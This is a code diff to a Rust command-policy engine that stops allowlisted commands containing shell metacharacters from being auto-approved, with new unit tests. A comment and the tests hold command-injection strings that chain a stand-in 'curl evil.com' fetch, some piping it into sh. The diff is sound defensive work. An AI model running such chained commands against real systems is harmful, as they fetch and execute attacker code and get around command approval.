@@ -33,8 +33,13 @@ impl PolicyEngine for RulePolicy {
             if self.command_denylist.iter().any(|d| cmd.contains(d.as_str())) {
                 return Decision::Deny(format!("command matches denylist: {cmd}"));
             }
+            // A command is auto-allowed only if its first token is allowlisted AND it
+            // contains no shell metacharacters — otherwise `sh -c` could run more than
+            // the vetted program (e.g. `ls && curl evil.com | sh`), so require approval.
+            const SHELL_META: &[char] = &[';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\\'];
             let first = cmd.split_whitespace().next().unwrap_or("");
-            if self.command_allowlist.iter().any(|a| a == first) {
+            let has_meta = cmd.contains(|c: char| SHELL_META.contains(&c));
+            if !has_meta && self.command_allowlist.iter().any(|a| a == first) {
                 return Decision::Allow;
             }
             return Decision::Ask;
@@ -99,6 +104,21 @@ mod tests {
     #[test]
     fn unknown_command_asks() {
         assert!(matches!(policy().check(&intent(Access::Write, vec![], Some("curl evil.com"))),
+            Decision::Ask));
+    }
+    #[test]
+    fn allowlisted_command_with_shell_operator_asks() {
+        assert!(matches!(policy().check(&intent(Access::Write, vec![], Some("ls && curl evil.com"))),
+            Decision::Ask));
+    }
+    #[test]
+    fn allowlisted_command_with_pipe_asks() {
+        assert!(matches!(policy().check(&intent(Access::Write, vec![], Some("ls | sh"))),
+            Decision::Ask));
+    }
+    #[test]
+    fn allowlisted_command_with_semicolon_asks() {
+        assert!(matches!(policy().check(&intent(Access::Write, vec![], Some("cat x; curl evil.com"))),
             Decision::Ask));
     }
 }
